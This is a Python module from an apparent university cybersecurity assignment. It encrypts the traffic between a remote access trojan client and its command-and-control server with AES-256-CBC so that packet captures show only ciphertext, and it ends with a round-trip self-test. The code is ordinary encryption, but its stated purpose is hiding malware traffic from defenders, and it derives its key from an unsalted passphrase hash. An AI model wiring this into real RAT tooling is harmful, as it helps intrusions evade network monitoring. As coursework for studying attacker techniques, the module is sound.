"""
AES-256-CBC Encryption for C2 Communications
MITRE ATT&CK: T1573.001 (Encrypted Channel: Symmetric Cryptography)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Encrypts all data between RAT client and C2 server so that
network capture (Wireshark) shows ciphertext instead of plaintext JSON.
"""

import json
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


def derive_key(passphrase):
    """
    Derive a 32-byte AES-256 key from a passphrase using SHA-256.
    Both client and server must use the same passphrase.
    """
    return hashlib.sha256(passphrase.encode("utf-8")).digest()


def encrypt_payload(data_dict, key):
    """
    Encrypt a Python dict into a base64 string.
    Format: base64(IV[16] + AES-CBC-ciphertext)

    Args:
        data_dict: Dictionary to encrypt
        key: 32-byte AES key from derive_key()

    Returns:
        Base64-encoded string containing IV + ciphertext
    """
    plaintext = json.dumps(data_dict, default=str).encode("utf-8")
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return base64.b64encode(iv + ciphertext).decode("utf-8")


def decrypt_payload(b64_data, key):
    """
    Decrypt a base64 string back into a Python dict.

    Args:
        b64_data: Base64-encoded string from encrypt_payload()
        key: 32-byte AES key (must match encryption key)

    Returns:
        Decrypted dictionary
    """
    raw = base64.b64decode(b64_data)
    iv = raw[:16]
    ciphertext = raw[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return json.loads(plaintext.decode("utf-8"))


if __name__ == "__main__":
    # Standalone test: encrypt/decrypt round trip
    print("=" * 50)
    print("  AES-256-CBC Encryption Test")
    print("=" * 50)

    test_passphrase = "rmit-edu-demo-2026"
    test_key = derive_key(test_passphrase)
    print(f"\n[*] Passphrase: {test_passphrase}")
    print(f"[*] Derived key (hex): {test_key.hex()[:32]}...")

    test_data = {
        "rat_id": "edu_rat_rmit",
        "data": {
            "hostname": "DESKTOP-TEST",
            "username": "student",
            "secret_info": "This should be encrypted on the wire"
        }
    }
    print(f"\n[*] Original data: {json.dumps(test_data, indent=2)}")

    encrypted = encrypt_payload(test_data, test_key)
    print(f"\n[*] Encrypted (base64): {encrypted[:80]}...")
    print(f"[*] Encrypted length: {len(encrypted)} chars")

    decrypted = decrypt_payload(encrypted, test_key)
    print(f"\n[*] Decrypted data: {json.dumps(decrypted, indent=2)}")

    assert decrypted == test_data, "DECRYPTION MISMATCH!"
    print(f"\n[+] Round-trip test PASSED - encryption/decryption working correctly")
